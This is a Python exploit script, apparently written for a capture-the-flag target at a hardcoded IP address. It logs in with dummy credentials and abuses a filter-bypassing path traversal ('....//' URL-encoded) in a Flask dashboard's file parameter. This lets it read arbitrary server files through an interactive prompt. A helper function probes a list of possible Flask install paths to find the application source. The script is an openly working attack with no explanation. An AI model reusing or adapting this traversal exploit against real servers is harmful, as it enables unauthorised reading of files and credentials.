from bs4 import BeautifulSoup
import requests

base_url = "http://94.72.112.248:10011"
login_endpoint = "/login"
dashboard_endpoint = "/dashboard?file=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f"

login_data = {
    "email": "a@a.com",
    "password": "a"
}

def leak_function(filename) -> str:
    with requests.Session() as session:
        login_url = f"{base_url}{login_endpoint}"
        login_response = session.post(login_url, data=login_data)
        dashboard_url = f"{base_url}{dashboard_endpoint}{filename}"
        r = session.get(dashboard_url)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, "html.parser")
            content = soup.find_all("p")[1]
            return content.get_text()
        else:
            return ""

def main():
    while True:
        query = input("> ")
        if query != "q":
                query = query.replace("/", "%2f")
                content = leak_function(query)
                print(content)
        else:
            quit()

def find_path():
        home_dir = "/root"
        python_version = "3.9.20"
        base_version = python_version.rsplit(".", 1)[0]

        potential_paths = [
        # lib
        ## pythonX.X
        f"/usr/local/lib/python{python_version}/site-packages/flask/app.py",
        f"/usr/local/lib/python{python_version}/dist-packages/flask/app.py",
        f"/usr/lib/python{python_version}/site-packages/flask/app.py",
        f"/usr/lib/python{python_version}/dist-packages/flask/app.py",
        f"{home_dir}/.local/lib/python{python_version}/dist-packages/flask/app.py",
        f"{home_dir}/.local/lib/python{python_version}/site-packages/flask/app.py",

        ## pythonX
        f"/usr/local/lib/python{base_version}/site-packages/flask/app.py",
        f"/usr/local/lib/python{base_version}/dist-packages/flask/app.py",
        f"/usr/lib/python{base_version}/site-packages/flask/app.py",
        f"/usr/lib/python{base_version}/dist-packages/flask/app.py",
        f"{home_dir}/.local/lib/python{base_version}/dist-packages/flask/app.py",
        f"{home_dir}/.local/lib/python{base_version}/site-packages/flask/app.py",

        # lib64
        ## pythonX.X
        f"/usr/local/lib64/python{python_version}/site-packages/flask/app.py",
        f"/usr/local/lib64/python{python_version}/dist-packages/flask/app.py",
        f"/usr/lib64/python{python_version}/site-packages/flask/app.py",
        f"/usr/lib64/python{python_version}/dist-packages/flask/app.py",
        f"{home_dir}/.local/lib64/python{python_version}/dist-packages/flask/app.py",
        f"{home_dir}/.local/lib64/python{python_version}/site-packages/flask/app.py"

        ## pythonX
        f"/usr/local/lib64/python{base_version}/site-packages/flask/app.py",
        f"/usr/local/lib64/python{base_version}/dist-packages/flask/app.py",
        f"/usr/lib64/python{base_version}/site-packages/flask/app.py",
        f"/usr/lib64/python{base_version}/dist-packages/flask/app.py",
        f"{home_dir}/.local/lib64/python{base_version}/dist-packages/flask/app.py",
        f"{home_dir}/.local/lib64/python{base_version}/site-packages/flask/app.py",
        ]

        found = []
        
        for path in potential_paths:
            content = leak_function(path)
            if "Nice try punk" not in content:
                 print(path)
                 found.append(path)

        print(found)  
        

if __name__ == "__main__":
    main()
    # find_path()
